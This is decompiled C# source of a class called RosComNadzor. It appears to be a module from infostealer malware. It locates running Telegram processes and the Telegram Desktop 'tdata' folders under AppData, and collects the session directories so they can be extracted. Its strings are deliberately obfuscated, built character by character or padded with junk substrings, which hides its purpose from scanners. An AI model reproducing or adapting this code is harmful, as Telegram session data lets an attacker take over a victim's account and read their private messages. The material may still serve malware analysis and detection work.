using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

// Token: 0x02000016 RID: 22
public class RosComNadzor : Extractor
{
	// Token: 0x17000004 RID: 4
	// (get) Token: 0x06000093 RID: 147 RVA: 0x00007430 File Offset: 0x00005830
	// (set) Token: 0x06000094 RID: 148 RVA: 0x00007438 File Offset: 0x00005838
	[Dynamic]
	public dynamic PassedPaths { [return: Dynamic] get; [param: Dynamic] set; } = new List<string>();

	// Token: 0x06000095 RID: 149 RVA: 0x00007444 File Offset: 0x00005844
	public override string Id2(Entity16 scannerArg, FileInfo fileInfo)
	{
		string result = new string(new char[]
		{
			'P',
			'r',
			'o',
			'f',
			'i',
			'l',
			'e',
			'_',
			'U',
			'n',
			'k',
			'n',
			'o',
			'w',
			'n'
		});
		try
		{
			DirectoryInfo directory = fileInfo.Directory;
			string text = string.Empty;
			bool flag = directory.Name != new string(new char[]
			{
				't',
				'd',
				'a',
				't',
				'a'
			});
			if (flag)
			{
				text = directory.FullName.Split(new string[]
				{
					new string(new char[]
					{
						't',
						'd',
						'a',
						't',
						'a'
					})
				}, StringSplitOptions.RemoveEmptyEntries)[1];
			}
			return new string(new char[]
			{
				'P',
				'r',
				'o',
				'f',
				'i',
				'l',
				'e',
				'_'
			}) + scannerArg.Id5 + (string.IsNullOrWhiteSpace(text) ? "" : ("\\" + text));
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00007528 File Offset: 0x00005928
	public override IEnumerable<Entity16> Id3()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
			int num = 1;
			List<string> processesByName = SystemInfoHelper.GetProcessesByName(new string[]
			{
				"T",
				"e",
				"l",
				"e",
				"gr",
				"am",
				".",
				"ex",
				"e"
			});
			foreach (string fileName in processesByName)
			{
				try
				{
					list.Add(new Entity16
					{
						Id5 = num.ToString(),
						Id2 = new string(new char[]
						{
							'*'
						}),
						Id1 = new FileInfo(fileName).Directory.FullName + new string(new char[]
						{
							'\\',
							't',
							'd',
							'a',
							't',
							'a'
						}),
						Id3 = false
					});
					foreach (string text in Directory.GetDirectories(new FileInfo(fileName).Directory.FullName + new string(new char[]
					{
						'\\',
						't',
						'd',
						'a',
						't',
						'a'
					})))
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						string name = directoryInfo.Name;
						bool flag = name.Length == 16;
						if (flag)
						{
							list.Add(new Entity16
							{
								Id5 = num.ToString(),
								Id2 = new string(new char[]
								{
									'*'
								}),
								Id1 = text,
								Id3 = false
							});
						}
					}
					num++;
				}
				catch (Exception ex)
				{
				}
			}
			bool flag2 = list.Count == 0;
			if (flag2)
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\TeEnvironmentlegraEnvironmentm DEnvironmentesktoEnvironmentp\\tdEnvironmentata".Replace("Environment", string.Empty);
				list.Add(new Entity16
				{
					Id5 = num.ToString(),
					Id2 = new string(new char[]
					{
						'*'
					}),
					Id1 = text2,
					Id3 = false
				});
				foreach (string text3 in Directory.GetDirectories(text2))
				{
					DirectoryInfo directoryInfo2 = new DirectoryInfo(text3);
					string name2 = directoryInfo2.Name;
					bool flag3 = name2.Length == 16;
					if (flag3)
					{
						list.Add(new Entity16
						{
							Id5 = num.ToString(),
							Id2 = new string(new char[]
							{
								'*'
							}),
							Id1 = text3,
							Id3 = false
						});
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
